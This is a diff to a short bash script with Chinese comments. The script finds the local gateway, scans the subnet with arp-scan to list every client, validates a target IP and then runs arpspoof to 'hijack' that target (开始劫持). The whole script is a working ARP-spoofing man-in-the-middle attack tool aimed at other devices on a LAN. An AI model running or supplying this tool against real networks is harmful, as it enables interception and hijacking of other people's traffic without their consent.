@@ -21,6 +21,9 @@ fi
 
 # 获取局域网网关
 GATEWAY=$(ip r | grep default | cut -d ' ' -f 3)
+IP_REG=^"${GATEWAY%.*}".[0-9]{1,3}$
+
+# echo $IP_REG                    # TEST
 echo "Gateway: $GATEWAY"
 # echo $GATEWAY                   # TEST
 
@@ -29,18 +32,18 @@ target_ip=                    # 目标IP
 
 # 自动获取
 # echo ${GATEWAY%.*}              # TEST
-# VALID_IPS=$(arp-scan ${GATEWAY%.*}.0/24 | grep -E '^([[:digit:]]{3}.){2}' | cut -f 1,3 )
-# echo $VALID_IPS                 # TEST
+echo -e "正在生成所有局域网内所有客户端列表...\n"
+arp-scan ${GATEWAY%.*}.0/24 | grep -E '^([[:digit:]]{3}.){2}'
 
 # echo "\$1：$1"                  # TEST
-if [[ -z "$target_ip" && -n "$1" && $1 =~ ^$GATEWAY[0-9]{1,3}$ ]]; then
+if [[ -z "$target_ip" && -n "$1" && $1 =~ $IP_REG ]]; then
     target_ip=$1
 else
     echo '请输入格式正确的目标IP.' >&2
     exit 1
 fi
 
-echo -e  "开始劫持...\n\n"
+echo -e  "\n开始劫持 $target_ip ...\n\n"
 arpspoof -i wlan0 -t $GATEWAY $target_ip
 
 exit
